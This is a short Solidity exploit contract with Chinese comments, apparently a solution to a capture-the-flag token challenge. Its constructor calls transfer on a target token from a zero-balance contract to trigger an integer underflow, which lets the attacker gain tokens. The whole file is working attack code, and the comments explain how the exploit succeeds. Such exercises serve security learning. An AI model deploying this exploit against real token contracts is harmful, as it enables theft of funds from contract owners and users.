// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
interface IToken {//接口合约中balanceof用于确认自己是否成功的
    function balanceof(address) external view returns (uint256);
    function transfer(address to,uint256 value) external returns (bool);
    //transfer函数必须存在于接口合约当中，这样才能被hack调用
}
contract Hcak{
    constructor(address _target) public{
        IToken(_target).transfer(msg.sender,1);
//这个地方直接调用转账，用本合约给自己地址转账1，使得溢出
    }
}